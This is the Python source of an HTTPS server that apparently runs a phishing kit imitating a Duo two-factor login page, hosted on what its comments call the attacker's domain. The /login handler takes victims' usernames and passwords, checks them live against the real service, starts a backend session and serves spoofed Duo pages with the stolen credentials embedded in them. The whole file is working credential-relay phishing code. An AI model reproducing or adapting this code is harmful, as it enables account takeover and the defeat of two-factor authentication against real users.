from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import sys
import os
import threading
import time
from client import duo
import mechanize
import urllib.parse
from http.cookies import SimpleCookie

def log(*args):
    print("[*] HTTPS_SERVER\t" + " ".join(map(str,args)))

def make_handler(duo_site, hostname, cross_origin):
    class CustomHandler(SilentHTTPRequestHandler, object):
        def __init__(self, *args, **kwargs):
            self.duo_site = duo_site
            self.hostname = hostname
            self.cross_origin = cross_origin
            super(CustomHandler, self).__init__(*args, **kwargs)
    return CustomHandler

class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
    def send_head(self):
        """Common code for GET and HEAD commands.
        This sends the response code and MIME headers.
        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.
        """
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            if not self.path.endswith('/'):
                # redirect browser - doing basically what apache does
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in "index.html", "index.htm":
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        ctype = self.guess_type(path)
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(path, 'rb')
        except IOError:
            self.send_error(404, "File not found")
            return None
        
        # Set custom headers for access control
        self.send_response(200)
        self.send_header("Content-type", ctype)
        fs = os.fstat(f.fileno())
        self.send_header("Content-Length", str(fs[6]))
        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.send_header("Access-Control-Allow-Origin", self.cross_origin)
        self.send_header("Access-Control-Allow-Credentials", "true");
        self.end_headers()
        return f

    def log_message(self, format, *args):
        return

    def do_POST(self):
        time.sleep(5)
        return "HE"

    def do_GET(self):
        # parse get parameters and put them into dictionary
        params = {}
        if "?" in self.path:
            pstr = self.path.split("?")[1]
            for p in pstr.split('&'): 
                plist = p.split('=')
                params[plist[0]] = urllib.parse.unquote(plist[1])
            self.path = self.path.split("?")[0]
        log("Received request to {} with GET parameters {}"
            .format(self.path, params))

        # If user makes get request to /login, server will test passed
        # credentials using DuoAuth class and send a response. 
        # Also starts up a docker container. Sends response through 
        # insecure content type instead of cookies because of cross
        # domain security. Hacky but works. 
        if self.path == "/login":

            # generate unique session ID
            SID = str(int(time.time() * 1000.0))

            # create a new session in the backend, e.g start up container
            self.socket_server.add_session(SID, 
                params["j_username"], params["j_password"])

            self.send_response(200)
            self.send_header("Content-type", "text/html")

            cookie = SimpleCookie()
            if not self.duo_site.validateCreds(
                params["j_username"], params["j_password"]):

                self.send_header("Access-Control-Allow-Origin", self.cross_origin)
                self.end_headers()
        
                # respond with sending the first duo login site. It will, 
                # through the response headers, recognize that login failed 
                # and reflect its UI accordingly
                p = "mobile-duo.html"   
                if params["mobile"] == "false":
                    p = "duo.html"
                        
                # since the html duo spoofers are templates, replace attacker
                # domain with actual domain
                with open("./idp/Authn/" + p) as page:
                    html = page.read()
                    html = html.replace("{{ATTACK_DOM}}", self.hostname);
                    html = html.replace(
                        "#passerr{display:none}", 
                        "#passerr{display:block}")
                    self.wfile.write(bytes(html, 'utf-8'))
            else:
                # Succesfully verified credentials. Send the next duo page.
                #cookie['sid'] = SID
                #self.send_header("Set-Cookie", cookie.output(header='', sep=''))
                self.send_header("Access-Control-Allow-Origin", self.cross_origin)
                #self.send_header("Access-Control-Allow-Credentials", "true");
                #self.send_header("Content-Type", "sid=" + SID)
                self.end_headers()

                # and reflect its UI accordingly
                p = "mobile-duo-2.html"   
                if params["mobile"] == "false":
                    p = "duo-2.html"
                 
                with open("./idp/Authn/" + p) as page:
                    html = page.read()
                    html = html.replace("{{USER}}", params["j_username"])
                    html = html.replace("{{PASS}}", params["j_password"])
                    html = html.replace("{{SID}}",  str(SID))
                    html = html.replace("{{MOBILE}}", params["mobile"])
                    self.wfile.write(bytes(html, 'utf-8'))

        # Loading request was made. Simulate page loading by astalling server
        elif self.path == "/load":
            if "time" in params.keys(): 
                # add 1000ms for good measure
                time.sleep(int(params["time"]))
            else:                       
                time.sleep(10)
            self.path = "/"
            super().do_GET()
        
        # Else, regular get request
        else:
            super().do_GET()
        

# Starts the https server that hosts public files on attacker's domain
def start_server(host, hostname, cross_origin, socket_server):
    key = os.path.abspath(os.path.dirname(__file__) + '/../ssl/key.pem')
    crt = os.path.abspath(os.path.dirname(__file__) + '/../ssl/cert.pem')
    log("Using key", key)
    log("Using certificate", crt)

    web_dir = os.path.join(os.path.dirname(__file__), 'public')
    os.chdir(web_dir)
                    
    log("Trying to host https server on", host + ":443")
    SilentHTTPRequestHandler.socket_server = socket_server
    httpd = HTTPServer((host, 443), 
        make_handler(duo.DuoAuth(mechanize.Browser()), hostname, cross_origin))

    httpd.socket = ssl.wrap_socket (httpd.socket, 
                    keyfile=key, 
                    certfile=crt, 
                    server_side=True)
    httpd.serve_forever()
